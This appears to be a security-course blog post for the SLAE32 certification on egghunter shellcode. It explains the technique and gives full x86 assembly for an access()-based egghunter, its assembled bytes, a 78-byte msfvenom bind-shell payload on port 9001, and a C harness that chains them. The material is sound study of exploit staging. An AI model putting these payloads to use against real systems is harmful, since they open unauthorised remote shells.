---
title: SLAE32 - Assignment#3 [Egghunter]
author: bigb0ss
date: 2020-12-26 23:53:00 +0800
categories: [SLAE32, Assignment_3_Egghunter]
tags: [slae32, assembly, x86, Egghunter]
image: /assets/img/post/slae32/slae32.png
---

<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

[SLAE32 Assignemt#3 Github](https://github.com/bigb0sss/SLAE32)

# Assignement #3 
* Study about the Egg Hunter shellcode
* Create a working demo of the Egghunter
* Should be configurable for different payloads

# What is Egghunter?
Personally, I have dealt with Egghunter when I was studying for the [OSCE course](https://www.offensive-security.com/offsec/retiring-ctp-intro-new-courses/) form Offensive Security. Egghunter is essentially a staged payload and is comprised with relatively short shellcode (around 30+ bytes). In a situation where the first buffer space is limited, we can implement the Egghunter shellcode there, and this will search the process memory for the much bigger buffer space where we place the signature (aka "Egg") with our final reverse/bind shellcode.

The below image is a simplified version of how Egghunter works: 

![image](/assets/img/post/slae32/assignment3/01.png)

# Egghunter In Depth

![image](/assets/img/post/slae32/assignment3/02.png)

Even though I knew what Egghunter was and how to use it, I wanted to understand it in greater detail. So I read Matt Miller's [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) to learn more about Egghunter. 

The following is the key take-away from the article:

* Per the author, 8 byte egg is recommended since it can give enough uniquness that it can eaily selected without running any high risk of a collision. 

## Linux Egghunter Implementation

* In Linux implementation, there are two main methods: 
    * 1) SIGSEGV handler to catch invalid memory address dereferences and prevent the program from crashing
    * 2) Using OS system call interface to validate process VMAs in kernel mode. 

* In Linux implementation, the SIGSEGV handler technique has a big drawback of a size issue. 

* In Linux implementation, the fact that the system call will return the `EFAULT` error code when it encounters an invalid memory space is the exact type of information needed for Egghunter since it can traverse the process' VAS without crashing the program. 

| Techniques (Linux) | Size | Executable Egg | Pros | Cons |
|:- |:- |:- |:- |
| access | 39 bytes | Yes | Very robust | Bigger size, Eggs should be executable, limiting the range of unique eggs |
| access (Improved) | 35 bytes | No | Very robust, non-executable eggs | Still a bit bigger size, Fails if Direction Flag (DF) is set | 
| sigaction | 30 bytes | No | Faster and smaller size | In certain scenarios, it may be not robust, Fails if Direction Flag (DF) is set |

## Windows Egghunter Implementation

* In Windows implementation, there are also two main methods:
    * 1) SEH (Structure Exception Handler)
    * 2) OS System call (IsBadReadPtr & NtDisplayString)

| Techniques (Windows) | Size | Executable Egg | Pros | Cons |
|:- |:- |:- |:- |
| SEH | 60 bytes | No | Can run on any Windows version, Can search eggs bigger than 8 bytes | Bigger size, Fails if Direction Flag (DF) is set |
| IsBadReadPtr | 37 bytes | No | Robust (API-based approach) | Use of a static VMA, Potential race condition, Fails if Direction Flag (DF) is set |
| NtDisplayString | 32 bytes | No | Smallest, Fastest, Most robust | Static system call number, Fails if Direction Flag (DF) is set |

# Egghunter Shellcode
For demonstration purposes, I will be using the Linux implementation of `access()` syscall version to build the Egghunter payload. Let's create the following `egghunter.nasm` file:

```s
global _start

section .text

_start:
        mov ebx, 0x50905090     ; 4 byte Egg (*Little-Endian)
        xor ecx, ecx            ; Zero out ECX
        mul ecx                 ; Zero out EAX and EDX

next_page:
        or dx, 0xfff            ; Set PAGE_SIZE 4095 (0x1000)

next_addr:
        inc edx                 ; Increment by 4095 (0x1000)
        pushad                  ; Preserve all general purposes register values onto the stack
        lea ebx, [edx+4]        ; Checking if the address is readable
        mov al, 0x21            ; Set AL to syscall access() (0x21)
        int 0x80                ; Soft-interrupt to execute the syscall

        cmp al, 0xf2            ; Check for EFAULT (Invalid memory space)
        popad                   ; Restore the preserved registers
        jz next_page            ; EFAULT --> Invalid memory space --> Next page

        cmp [edx], ebx          ; Check for the address if it contains our egg
        jnz next_addr           ; If not, go back to look for our first egg 

        cmp [edx+4], ebx        ; Check for the address + 4 if it contains our second egg 
        jnz next_addr           ; If not, go back to look for our second egg

        jmp edx                 ; Both eggs are found --> JMP to EDX --> Continue execution flow
```

## Compile + Bind Shellcode (msfvenom)

I created a simple compiler [compilerX86.py](https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py). 

```console
root@kali:~/Documents/SLAE32/Exam/Assignement3# python compilerX86.py -f egghunter
 
  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
 |\   ____\|\   __  \|\   _ \  _   \|\   __  \|\  \|\  \     |\  ___ \ |\   __  \   |\  \  /  /|\   __  \|\   ____\        
 \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \ \  \    \ \   __/|\ \  \|\  \  \ \  \/  / | \  \|\  \ \  \___|      
  \ \  \    \ \  \\\  \ \  \\|__| \  \ \   ____\ \  \ \  \    \ \  \_|/_\ \   _  _\  \ \    / / \ \   __  \ \  \____   
   \ \  \____\ \  \\\  \ \  \    \ \  \ \  \___|\ \  \ \  \____\ \  \_|\ \ \  \\  \|  /     \/   \ \  \|\  \ \  ___  \ 
    \ \_______\ \_______\ \__\    \ \__\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ /  /\   \    \ \_______\ \_______\ 
     \|_______|\|_______|\|__|     \|__|\|__|     \|__|\|_______|\|_______|\|__|\|__/__/ /\ __\    \|_______|\|_______|    
                                                                                    |__|/ \|__|     [bigb0ss] v1.0         

[+] Assemble: egghunter.nasm
[+] Linking: egghunter.o
[+] Shellcode: "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!
```

Additionally, using msfvenom, let's create a bind shell:

```console
root@kali:~/Documents/SLAE32/Exam/Assignement3# msfvenom -p linux/x86/shell_bind_tcp lport=9001 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x23\x29\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```

## Final Touch

Finally, let's combine those bind shellcode and egghunter to create the following exploit script `egghunter.c`:

```c
#include <stdio.h>

unsigned char egghunter[] = \
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42"
"\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a"
"\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

unsigned char shellcode[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50"  // Egg
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x23\x29\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";

void main() {
    int (*ret)() = (int(*)())egghunter;
    ret();

    return 0;
}
```

![image](/assets/img/post/slae32/assignment3/03.png)


<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

[SLAE32 Assignemt#3 Github](https://github.com/bigb0sss/SLAE32)